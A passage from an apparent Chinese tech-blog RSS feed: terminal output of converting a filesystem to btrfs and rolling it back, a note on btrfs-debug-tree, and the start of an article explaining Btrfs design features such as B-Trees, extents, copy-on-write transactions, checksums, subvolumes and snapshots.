<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Nodesize:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">       16384</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">           68f5d99f-e845-4fd7-8f84-701604f07604</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Checksum:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       crc32c</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Features:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">       extref,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> skinny-metadata,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> no-holes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (default)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    Data</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> csum:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    yes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    Inline</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> data:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  yes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">    Copy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> xattr:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">   yes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Reported</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> stats:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> space:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">     21474836480</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Free</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> space:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      20693188608</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (96.36%)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Inode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> count:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">         1310720</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Free</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inodes:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">         1310708</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Block</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> count:</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">         5242880</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> initial</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filesystem</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ext2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> image</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> file</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> metadata</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Copy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inodes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [o] [         3/        12]</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Conversion</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> complete</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs filesystem show</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 'mydata'</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 92aac6fd-d7c5-4ac3-9ba6-acbe13071611</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 640.00KiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 272.00MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 1.27GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n4</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Label:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> none</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  uuid:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 68f5d99f-e845-4fd7-8f84-701604f07604</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        Total</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> devices</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> FS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 494.20MiB</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">        devid</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">    1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 20.00GiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> used</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 780.30MiB</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> path</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/nvme0n5</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# mount /dev/nvme0n5 /ext4/</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# ls /ext4/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">111</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  ext2_saved</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  lost+found</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>恢复</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# umount /ext4</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[root@fedora ~]# btrfs-convert -r /dev/nvme0n5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">btrfs-convert</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> btrfs-progs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> v6.0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> filesystem</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> for</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> rollback:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Label:</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  UUID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">            68f5d99f-e845-4fd7-8f84-701604f07604</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  Restoring</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> from:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  ext2_saved/image</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Rollback</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> succeeded</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>Debug 功能</h2>
<div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-text"><span class="line"><span>Btrfs 提供了一定的 debug 功能，对于想了解 Btrfs 内部实现原理的读者，debug 将是您最喜欢的工具。这里简单介绍一下 debug 功能的命令使用。</span></span>
<span class="line"><span>下面的命令将设备 sda5 上的 btrfs 文件系统中的元数据打印到屏幕上。</span></span>
<span class="line"><span>1#btrfs-debug-tree /dev/sda5</span></span>
<span class="line"><span>通过对打印信息的分析，您将能了解 btrfs 内部各个 BTree 的变化情况，从而进一步理解每一个文件系统功能的内部实现细节。</span></span>
<span class="line"><span>比如您可以在创建一个文件之前将 BTree 的内容打印出来，创建文件后再次打印。通过比较两次的不同来了解 btrfs 创建一个文件需要修改哪些元数据。进而理解 btrfs 内部的工作原理。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Linux文件系统的未来Btrfs</title>
      <link>https://www.geekery.cn/note-book/Btrfs/Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%9C%AA%E6%9D%A5Btrfs.html</link>
      <guid>https://www.geekery.cn/note-book/Btrfs/Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%9C%AA%E6%9D%A5Btrfs.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Linux文件系统的未来Btrfs</source>
      <description>Linux文件系统的未来Btrfs Btrfs 简介 文件系统似乎是内核中比较稳定的部分，多年来，人们一直使用 ext2/3，ext 文件系统以其卓越的稳定性成为了事实上的 Linux 标准文件系统。近年来 ext2/3 暴露出了一些扩展性问题，于是便催生了 ext4 。在 2008 年发布的 Linux2.6.19 内核中集成了 ext4 的 dev...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>Btrfs 简介</h2>
<p>文件系统似乎是内核中比较稳定的部分，多年来，人们一直使用 ext2/3，ext 文件系统以其卓越的稳定性成为了事实上的 Linux 标准文件系统。近年来 ext2/3  暴露出了一些扩展性问题，于是便催生了 ext4 。在 2008 年发布的 Linux2.6.19 内核中集成了 ext4 的 dev 版本。  2.6.28 内核发布时，ext4 结束了开发版，开始接受用户的使用。似乎 ext 就将成为 Linux 文件系统的代名词。然而当您阅读很多有关 ext4 的文章时，会发现都不约而同地提到了 btrfs，并认为 ext4 将是一个过渡的文件系统。 ext4 的作者 Theodore  Tso 也盛赞 btrfs 并认为 btrfs 将成为下一代 Linux 标准文件系统。 Oracle，IBM， Intel 等厂商也对  btrfs 表现出了极大的关注，投入了资金和人力。为什么 btrfs 如此受人瞩目呢。这便是本文首先想探讨的问题。</p>
<p>Kevin Bowling[1] 有一篇介绍各种文件系统的文章，在他看来，ext2/3 等文件系统属于“古典时期”。文件系统的新时代是 2005 年由  Sun 公司的 ZFS 开创的。 ZFS 代表” last word in file system  ”，意思是此后再也不需要开发其他的文件系统了。 ZFS 的确带来了很多崭新的观念，对文件系统来讲是一个划时代的作品。</p>
<p>如果您比较 btrfs 的特性，将会发现 btrfs 和 ZFS 非常类似。也许我们可以认为 btrfs 就是 Linux 社区对 ZFS 所作出的回应。从此往后在 Linux 中也终于有了一个可以和 ZFS 相媲美的文件系统。</p>
<p></p>
<h2>btrfs 的特性</h2>
<p>您可以在 btrfs 的主页上 [2] 看到 btrfs 的特性列表。我自作主张，将那张列表分成了四大部分。</p>
<p>首先是扩展性 (scalability) 相关的特性，btrfs 最重要的设计目标是应对大型机器对文件系统的扩展性要求。 Extent，B-Tree 和动态 inode 创建等特性保证了 btrfs 在大型机器上仍有卓越的表现，其整体性能而不会随着系统容量的增加而降低。</p>
<p>其次是数据一致性 (data integrity) 相关的特性。系统面临不可预料的硬件故障，Btrfs 采用 COW 事务技术来保证文件系统的一致性。  btrfs 还支持 checksum，避免了 silent corrupt 的出现。而传统文件系统则无法做到这一点。</p>
<p>第三是和多设备管理相关的特性。 Btrfs 支持创建快照 (snapshot)，和克隆 (clone) 。 btrfs 还能够方便的管理多个物理设备，使得传统的卷管理软件变得多余。</p>
<p>最后是其他难以归类的特性。这些特性都是比较先进的技术，能够显著提高文件系统的时间 / 空间性能，包括延迟分配，小文件的存储优化，目录索引等。</p>
<h3>扩展性相关的特性</h3>
<p></p>
<p>B-Tree</p>
<p>btrfs 文件系统中所有的 metadata 都由 BTree 管理。使用 BTree 的主要好处在于查找，插入和删除操作都很高效。可以说 BTree 是 btrfs 的核心。</p>
<p>一味地夸耀 BTree 很好很高效也许并不能让人信服，但假如稍微花费一点儿时间看看 ext2/3 中元数据管理的实现方式，便可以反衬出 BTree 的优点。</p>
<p>妨碍 ext2/3 扩展性的一个问题来自其目录的组织方式。目录是一种特殊的文件，在 ext2/3 中其内容是一张线性表格。如图 1-1 所示 [6]：</p>
<h3>图 1. ext2 directory [6]</h3>
<p></p>
<p>图 1 展示了一个 ext2 目录文件的内容，该目录中包含四个文件。分别是 "home1"，"usr"，"oldfile" 和 "sbin" 。如果需要在该目录中查找目录 sbin，ext2 将遍历前三项，直至找到 sbin 这个字符串为止。</p>
<p>这种结构在文件个数有限的情况下是比较直观的设计，但随着目录下文件数的增加，查找文件的时间将线性增长。 2003 年，ext3 设计者开发了目录索引技术，解决了这个问题。目录索引使用的数据结构就是 BTree 。如果同一目录下的文件数超过  2K，inode 中的 i_data 域指向一个特殊的 block 。在该 block 中存储着目录索引 BTree 。 BTree  的查找效率高于线性表，</p>
<p>但为同一个元数据设计两种数据结构总是不太优雅。在文件系统中还有很多其他的元数据，用统一的 BTree 管理是非常简单而优美的设计。</p>
<p>Btrfs 内部所有的元数据都采用 BTree 管理，拥有良好的可扩展性。 btrfs 内部不同的元数据由不同的 Tree 管理。在 superblock 中，有指针指向这些 BTree 的根。如图 2 所示：</p>
<h3>图 2. btrfs btree</h3>
<p>文件系统数据结构</p>
<p></p>
<p>文件目录结构</p>
<p></p>
<p>FS Tree 管理文件相关的元数据，如 inode，dir 等； Chunk tree 管理设备，每一个磁盘设备都在 Chunk Tree  中有一个 item ； Extent Tree 管理磁盘空间分配，btrfs 每分配一段磁盘空间，便将该磁盘空间的信息插入到 Extent  tree 。查询 Extent Tree 将得到空闲的磁盘空间信息； Tree of tree root 保存很多 BTree  的根节点。比如用户每建立一个快照，btrfs 便会创建一个 FS Tree 。为了管理所有的树，btrfs 采用 Tree of tree  root 来保存所有树的根节点； checksum Tree 保存数据块的校验和。</p>
<p><strong>基于 Extent 的文件存储</strong></p>
<p>现代很多文件系统都采用了 extent 替代 block 来管理磁盘。 Extent 就是一些连续的 block，一个 extent 由起始的 block 加上长度进行定义。</p>
<p>Extent 能有效地减少元数据开销。为了进一步理解这个问题，我们还是看看 ext2 中的反面例子。</p>
<p>ext2/3 以 block 为基本单位，将磁盘划分为多个 block 。为了管理磁盘空间，文件系统需要知道哪些 block 是空闲的。 Ext 使用  bitmap 来达到这个目的。 Bitmap 中的每一个 bit 对应磁盘上的一个 block，当相应 block 被分配后，bitmap  中的相应 bit 被设置为 1 。这是很经典也很清晰的一个设计，但不幸的是当磁盘容量变大时，bitmap  自身所占用的空间也将变大。这就导致了扩展性问题，随着存储设备容量的增加，bitmap  这个元数据所占用的空间也随之增加。而人们希望无论磁盘容量如何增加，元数据不应该随之线形增加，这样的设计才具有可扩展性。</p>
<p>下图比较了 block 和 extent 的区别：</p>
<h3>图 3. 采用 extent 的 btrfs 和采用 bitmap 的 ext2/3</h3>
<p></p>
<p>在 ext2/3 中，10 个 block 需要 10 个 bit 来表示；在 btrfs 中则只需要一个元数据。对于大文件，extent 表现出了更加优异的管理性能。</p>
<p>Extent 是 btrfs 管理磁盘空间的最小单位，由 extent tree 管理。 Btrfs 分配 data 或 metadata 都需要查询 extent tree 以便获得空闲空间的信息。</p>
<p><strong>动态 inode 分配</strong></p>
<p>为了理解动态 inode 分配，还是需要借助 ext2/3 。下表列举了 ext2 文件系统的限制：</p>
<h3>表 1. ext2 限制</h3>
<p>限制<strong>最大文件数量</strong>文件系统空间大小 V / 8192
比如 100G 大小的文件系统中，能创建的文件个数最大为 131072</p>
<p>图 4 显示了 ext2 的磁盘布局：</p>
<h3>图 4. ext2 layout</h3>
<p></p>
<p>在 ext2 中 inode 区是被预先固定分配的，且大小固定，比如一个 100G 的分区中，inode table 区中只能存放 131072 个 inode，这就意味着不可能创建超过 131072 个文件，因为每一个文件都必须有一个唯一的 inode 。</p>
<p>为了解决这个问题，必须动态分配 inode 。每一个 inode 只是 BTree 中的一个节点，用户可以无限制地任意插入新的 inode，其物理存储位置是动态分配的。所以 btrfs 没有对文件个数的限制。</p>
<p><strong>针对 SSD 的优化支持</strong></p>
<p>SSD 是固态存储 Solid State Disk 的简称。在过去的几十年中，CPU/RAM 等器件的发展始终遵循着摩尔定律，但硬盘 HDD 的读写速率却始终没有飞跃式的发展。磁盘 IO 始终是系统性能的瓶颈。</p>
<p>SSD 采用 flash memory 技术，内部没有磁盘磁头等机械装置，读写速率大幅度提升。 flash memory 有一些不同于 HDD  的特性。 flash 在写数据之前必须先执行擦除操作；其次，flash  对擦除操作的次数有一定的限制，在目前的技术水平下，对同一个数据单元最多能进行约 100 万次擦除操作，因此，为了延长 flash  的寿命，应该将写操作平均到整个 flash 上。</p>
<p>SSD 在硬件内部的微代码中实现了  wear leveling 等分布写操作的技术，因此系统无须再使用特殊的 MTD 驱动和 FTL 层。虽然 SSD  在硬件层面做了很多努力，但毕竟还是有限。文件系统针对 SSD 的特性做优化不仅能提高 SSD 的使用寿命，而且能提高读写性能。 Btrfs  是少数专门对 SSD 进行优化的文件系统。 btrfs 用户可以使用 mount 参数打开对 SSD 的特殊优化处理。</p>
<p>Btrfs 的 COW 技术从根本上避免了对同一个物理单元的反复写操作。如果用户打开了 SSD 优化选项，btrfs  将在底层的块空间分配策略上进行优化：将多次磁盘空间分配请求聚合成一个大小为 2M 的连续的块。大块连续地址的 IO 能够让固化在 SSD  内部的微代码更好的进行读写优化，从而提高 IO 性能。</p>
<h3>数据一致性相关的特性</h3>
<p><strong>COW 事务</strong></p>
<p>理解 COW 事务，必须首先理解 COW 和事务这两个术语。</p>
<p>什么是 COW?</p>
<p>所谓 COW，即每次写磁盘数据时，先将更新数据写入一个新的 block，当新数据写入成功之后，再更新相关的数据结构指向新 block 。</p>
<p>什么是事务？</p>
<p>COW 只能保证单一数据更新的原子性。但文件系统中很多操作需要更新多个不同的元数据，比如创建文件需要修改以下这些元数据：</p>
<ol>
<li>修改 extent tree，分配一段磁盘空间</li>
<li>创建一个新的 inode，并插入 FS Tree 中</li>
<li>增加一个目录项，插入到 FS Tree 中</li>
</ol>
<p>任何一个步骤出错，文件便不能创建成功，因此可以定义为一个事务。</p>
<p>下面将演示一个 COW 事务。</p>
<p>A 是 FS Tree 的根节点，新的 inode 的信息将被插入节点 C 。首先，btrfs 将 inode 插入一个新分配的 block C  ’中，并修改上层节点 B，使其指向新的 block C ’；修改 B 也将引发 COW，以此类推，引发一个连锁反应，直到最顶层的 Root A  。当整个过程结束后，新节点 A ’变成了 FS Tree 的根。但此时事务并未结束，superblock 依然指向 A 。</p>
<h3>图 5. COW transaction 1</h3>
<p></p>
<p>接下来，修改目录项（E 节点），同样引发这一过程，从而生成新的根节点 A ’’。</p>
<h3>图 6. COW transaction 2</h3>
<p></p>
<p>此时，inode 和目录项都已经写入磁盘，可以认为事务已经结束。 btrfs 修改 superblock，使其指向 A ’’，如下图所示：</p>
<h3>图 7. COW transaction 3</h3>
<p></p>
<p>COW 事务能够保证文件系统的一致性，并且系统 Reboot 之后不需要执行 fsck 。因为 superblock 要么指向新的 A ’’，要么指向 A，无论哪个都是一致的数据。</p>
<p><strong>Checksum</strong></p>
<p>Checksum 技术保证了数据的可靠性，避免 silent corruption 现象。由于硬件原因，从磁盘上读出的数据会出错。比如 block A  中存放的数据为 0x55，但读取出来的数据变是 0x54，因为读取操作并未报错，所以这种错误不能被上层软件所察觉。</p>
<p>解决这个问题的方法是保存数据的校验和，在读取数据后检查校验和。如果不符合，便知道数据出现了错误。</p>
<p>ext2/3 没有校验和，对磁盘完全信任。而不幸的是，磁盘的错误始终存在，不仅发生在廉价的 IDE 硬盘上，昂贵的 RAID 也存在 silent  corruption 问题。而且随着存储网络的发展，即使数据从磁盘读出正确，也很难确保能够安全地穿越网络设备。</p>
<p>btrfs 在读取数据的同时会读取其相应的 checksum 。如果最终从磁盘读取出来的数据和 checksum 不相同，btrfs  会首先尝试读取数据的镜像备份，如果数据没有镜像备份，btrfs 将返回错误。写入磁盘数据之前，btrfs 计算数据的 checksum 。然后将 checksum 和数据同时写入磁盘。</p>
<p>Btrfs 采用单独的 checksum Tree 来管理数据块的校验和，把 checksum 和 checksum 所保护的数据块分离开，从而提供了更严格的保护。假如在每个数据 block 的 header 中加入一个域保存 checksum，那么这个数据 block  就成为一个自己保护自己的结构。这种结构下有一种错误无法检测出来，比如本来文件系统打算从磁盘上读 block A，但返回了 block B，由于  checksum 在 block 内部，因此 checksum 依旧是正确的。 btrfs 采用 checksum tree 来保存数据块的  checksum，避免了上述问题。</p>
<p>Btrfs 采用 crc32 算法计算 checksum，在将来的开发中会支持其他类型的校验算法。为了提高效率，btrfs 将写数据和 checksum 的工作分别用不同的内核线程并行执行。</p>
<h3>多设备管理相关的特性</h3>
<p>每个 Unix 管理员都曾面临为用户和各种应用分配磁盘空间的任务。多数情况下，人们无法事先准确地估计一个用户或者应用在未来究竟需要多少磁盘空间。磁盘空间被用尽的情况经常发生，此时人们不得不试图增加文件系统空间。传统的 ext2/3 无法应付这种需求。</p>
<p>很多卷管理软件被设计出来满足用户对多设备管理的需求，比如 LVM 。 Btrfs 集成了卷管理软件的功能，一方面简化了用户命令；另一方面提高了效率。</p>
<p><strong>多设备管理</strong></p>
<p>Btrfs 支持动态添加设备。用户在系统中增加新的磁盘之后，可以使用 btrfs 的命令将该设备添加到文件系统中。</p>
<p>为了灵活利用设备空间，Btrfs 将磁盘空间划分为多个 chunk 。每个 chunk 可以使用不同的磁盘空间分配策略。比如某些 chunk 只存放 metadata，某些  chunk 只存放数据。一些 chunk 可以配置为 mirror，而另一些 chunk 则可以配置为 stripe  。这为用户提供了非常灵活的配置可能性。</p>
<p><strong>Subvolume</strong></p>
<p>Subvolume 是很优雅的一个概念。即把文件系统的一部分配置为一个完整的子文件系统，称之为 subvolume 。</p>
<p>采用  subvolume，一个大的文件系统可以被划分为多个子文件系统，这些子文件系统共享底层的设备空间，在需要磁盘空间时便从底层设备中分配，类似应用程序调用 malloc() 分配内存一样。可以称之为存储池。这种模型有很多优点，比如可以充分利用 disk 的带宽，可以简化磁盘空间的管理等。</p>
<p>所谓充分利用 disk 的带宽，指文件系统可以并行读写底层的多个 disk，这是因为每个文件系统都可以访问所有的 disk 。传统的文件系统不能共享底层的 disk 设备，无论是物理的还是逻辑的，因此无法做到并行读写。</p>
<p>所谓简化管理，是相对于 LVM 等卷管理软件而言。采用存储池模型，每个文件系统的大小都可以自动调节。而使用 LVM，如果一个文件系统的空间不够了，该文件系统并不能自动使用其他磁盘设备上的空闲空间，而必须使用 LVM 的管理命令手动调节。</p>
<p>Subvolume 可以作为根目录挂载到任意 mount 点。 subvolume 是非常有趣的一个特性，有很多应用。</p>
<p>假如管理员只希望某些用户访问文件系统的一部分，比如希望用户只能访问 /var/test/ 下面的所有内容，而不能访问 /var/ 下面其他的内容。那么便可以将 /var/test 做成一个 subvolume 。 /var/test 这个 subvolume 便是一个完整的文件系统，可以用 mount 命令挂载。比如挂载到 /test 目录下，给用户访问 /test 的权限，那么用户便只能访问 /var/test 下面的内容了。</p>
<p>快照和克隆</p>
<p>快照是对文件系统某一时刻的完全备份。建立快照之后，对文件系统的修改不会影响快照中的内容。这是非常有用的一种技术。</p>
<p>比如数据库备份。假如在时间点  T1，管理员决定对数据库进行备份，那么他必须先停止数据库。备份文件是非常耗时的操作，假如在备份过程中某个应用程序修改了数据库的内容，那么将无法得到一个一致性的备份。因此在备份过程中数据库服务必须停止，对于某些关键应用这是不能允许的。</p>
